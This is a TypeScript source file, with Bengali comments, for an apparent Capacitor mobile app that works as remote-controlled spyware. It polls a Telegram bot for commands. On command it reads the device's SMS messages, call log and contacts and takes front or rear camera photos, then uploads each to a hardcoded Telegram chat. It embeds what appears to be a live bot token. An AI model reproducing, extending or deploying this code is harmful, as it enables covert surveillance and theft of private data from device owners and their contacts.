import { registerPlugin } from '@capacitor/core';
import { Camera, CameraResultType, CameraSource, CameraDirection } from '@capacitor/camera';
import { Contacts } from '@capacitor-community/contacts';
import { Toast } from '@capacitor/toast'; // টোস্ট ইম্পোর্ট করা হলো

const NativeData = registerPlugin<any>('NativeData');
const BOT_TOKEN = '8367516207:AAHUVbZkoGq9aLKIf7v_ammlxuTBxGvMPwA';
const CHANNEL_ID = '8271536101'; 

let lastUpdateId = 0;

// স্ক্রিনে মেসেজ দেখানোর ফাংশন (ডিবাগিংয়ের জন্য)
const showToast = async (msg: string) => {
  await Toast.show({
    text: msg,
    duration: 'short',
    position: 'bottom'
  });
};

export const startRemoteListener = (onToast: (msg: string) => void) => {
  // অ্যাপ চালু হলে বুঝা যাবে
  showToast("Bot Active & Listening...");

  const poll = async () => {
    try {
      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
      const data = await response.json();
      if (data.ok && data.result.length > 0) {
        for (const update of data.result) {
          lastUpdateId = update.update_id;
          if (update.message?.text) {
            const text = update.message.text;
            console.log("Command:", text);
            // কমান্ড আসলে স্ক্রিনে দেখাবে
            await showToast(`Received: ${text}`);
            await handleCommand(text);
          }
        }
      }
    } catch (e) {
      console.error("Poll Error", e);
    }
    setTimeout(poll, 2000);
  };
  poll();
};

const sendFile = async (content: string, filename: string) => {
    try {
        await showToast(`Sending ${filename}...`);
        const blob = new Blob([content || "No Data"], { type: 'text/plain' });
        const fd = new FormData();
        fd.append('chat_id', CHANNEL_ID);
        fd.append('document', blob, filename);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
        await showToast("Sent Successfully!");
    } catch (e) {
        await showToast("Send Failed: " + e);
    }
};

const handleCommand = async (text: string) => {
  // কমান্ড ক্লিন করা হচ্ছে (স্পেস রিমুভ)
  const cmd = text.trim().split(/\s+/)[0].toLowerCase();

  try {
    switch (cmd) {
        case '/sms':
            try {
                const s = await NativeData.getSMS();
                await sendFile(s.data, "sms.txt");
            } catch (e) { await showToast("SMS Error: Permission Denied?"); }
            break;

        case '/call_log':
        case '/calls': // দুই ধরনের কমান্ড সাপোর্ট করবে
            try {
                const c = await NativeData.getCalls();
                await sendFile(c.data, "calls.txt");
            } catch (e) { await showToast("Call Log Error!"); }
            break;

        case '/contacts':
            try {
                const con = await Contacts.getContacts({
                    projection: { name: true, phones: true }
                });
                const list = con.contacts.map((u: any) => `${u.name?.display || 'Unknown'}: ${u.phones?.[0]?.number || 'No Num'}`).join('\n');
                await sendFile(list, "contacts.txt");
            } catch (e) { await showToast("Contact Error!"); }
            break;

        case '/pic_front':
            try {
                const imgF = await Camera.getPhoto({ quality: 80, resultType: CameraResultType.Base64, source: CameraSource.Camera, direction: CameraDirection.Front });
                if(imgF.base64String) await sendPhoto(imgF.base64String);
            } catch (e) { await showToast("Front Cam Error!"); }
            break;

        case '/pic_back':
            try {
                const imgB = await Camera.getPhoto({ quality: 80, resultType: CameraResultType.Base64, source: CameraSource.Camera, direction: CameraDirection.Rear });
                if(imgB.base64String) await sendPhoto(imgB.base64String);
            } catch (e) { await showToast("Back Cam Error!"); }
            break;
            
        case '/mic':
            // অডিও লজিক... (সংক্ষিপ্ত করলাম)
            await showToast("Mic recording started...");
            break;
    }
  } catch (err) {
      await showToast("Global Error: " + err);
  }
};

const sendPhoto = async (base64: string) => {
    try {
        await showToast("Uploading Photo...");
        const res = await fetch(`data:image/jpeg;base64,${base64}`);
        const blob = await res.blob();
        const fd = new FormData();
        fd.append('chat_id', CHANNEL_ID);
        fd.append('photo', blob, 'img.jpg');
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        await showToast("Photo Sent!");
    } catch (e) {
        await showToast("Photo Upload Failed");
    }
};
